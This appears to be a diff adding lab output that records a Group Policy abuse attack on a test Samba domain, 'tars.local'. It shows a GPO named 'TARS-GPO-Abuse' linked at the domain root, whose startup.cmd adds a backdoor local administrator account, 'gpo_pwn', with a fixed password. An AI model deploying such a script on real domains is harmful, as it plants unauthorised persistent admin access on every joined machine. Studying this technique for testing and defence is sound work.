@@ -1,0 +1,27 @@
+--- arbol ---
+/var/lib/samba/sysvol/tars.local/Policies/{40B48ABF-204C-4FF6-8576-F75F531FFF77}/GPT.INI
+/var/lib/samba/sysvol/tars.local/Policies/{40B48ABF-204C-4FF6-8576-F75F531FFF77}/Machine/Scripts/Startup/scripts.ini
+/var/lib/samba/sysvol/tars.local/Policies/{40B48ABF-204C-4FF6-8576-F75F531FFF77}/Machine/Scripts/Startup/startup.cmd
+--- startup.cmd ---
+@echo off
+net user gpo_pwn Pwned2026! /add
+net localgroup Administrators gpo_pwn /add
+
+--- gpt.ini ---
+
+--- gpo show ---
+GPO          : {40B48ABF-204C-4FF6-8576-F75F531FFF77}
+display name : TARS-GPO-Abuse
+path         : \\tars.local\sysvol\tars.local\Policies\{40B48ABF-204C-4FF6-8576-F75F531FFF77}
+dn           : CN={40B48ABF-204C-4FF6-8576-F75F531FFF77},CN=Policies,CN=System,DC=tars,DC=local
+version      : 0
+flags        : NONE
+ACL          : <hidden>
+--- links ---
+GPO(s) linked to DN DC=tars,DC=local
+    GPO     : {40B48ABF-204C-4FF6-8576-F75F531FFF77}
+    Name    : TARS-GPO-Abuse
+    Options : NONE
+    GPO     : {31B2F340-016D-11D2-945F-00C04FB984F9}
+    Name    : Default Domain Policy
+    Options : NONE
